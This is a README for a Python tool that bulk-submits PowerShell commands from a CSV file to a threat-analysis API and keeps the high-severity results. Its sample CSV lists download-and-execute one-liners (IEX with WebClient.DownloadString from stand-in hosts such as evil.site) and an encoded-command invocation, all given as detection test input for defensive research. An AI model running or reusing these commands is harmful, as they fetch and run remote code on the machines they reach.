# PowerShell Command Analysis – CSV to API

This repo contains a small Python utility that reads PowerShell commands from a CSV file, submits each command to the **PowerShell Exposed Analysis API**, and saves results **only when the command is classified as `high` or `critical` severity**, but you can change for as many severities you want.

It is designed for **bulk analysis**, **detection research**, and **threat-hunting workflows**.

---

## Features

- Reads commands from a CSV file
- Ignores the header row automatically
- Sends one POST request per command
- Authenticates using a Bearer API token
- Saves output **only** when:
  - `success == true`
  - `analysis.severity` is `high` or `critical`
- Stores each result as an individual `.json` file
- Adds useful metadata (line number, command, HTTP status)

---

## Requirements

- Python **3.9+**
- `requests` library

Install dependencies:

```bash
pip install -r requirements.txt
```

---

## Quick Start

1) Clone the repo  
2) Install dependencies  
3) Set your token  
4) Run

```bash
# 1) install
pip install -r requirements.txt

# 2) edit analyze_csv.py and set API_TOKEN
# API_TOKEN = "YOUR_API_TOKEN"

# 3) run
python analyze_csv.py
```

Example console output:

```text
[Line 2] severity=critical ✅ saved → outputs/result_line_2.json
[Line 3] severity=medium ❌ not saved
[Line 4] severity=None ❌ not saved
```

---

## CSV Format

The CSV must contain **one PowerShell command per line**.  
The **first row is ignored** (header).

Example:

```csv
command
IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload1.ps1')
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.site/a.ps1')
powershell -enc SQBFAFgA
```

Only the **first column** is used.

---

## Configuration

Edit these values in `analyze_csv.py`:

```python
API_URL = "https://api.powershell.exposed/evaluate"
API_TOKEN = "YOUR_API_TOKEN"
CSV_FILE = "commands.csv"
OUTPUT_DIR = "outputs"
```

Severity filter:

```python
SAVE_SEVERITIES = {"high", "critical"}
```

---

## Output

Each saved file is written to the `outputs/` directory and contains:

- CSV line number
- Original command
- Request payload
- HTTP status code
- Full API response

---

## Disclaimer

This tool is intended for **defensive security research and detection engineering** purposes only.  
Ensure you have proper authorization before analyzing or submitting commands.
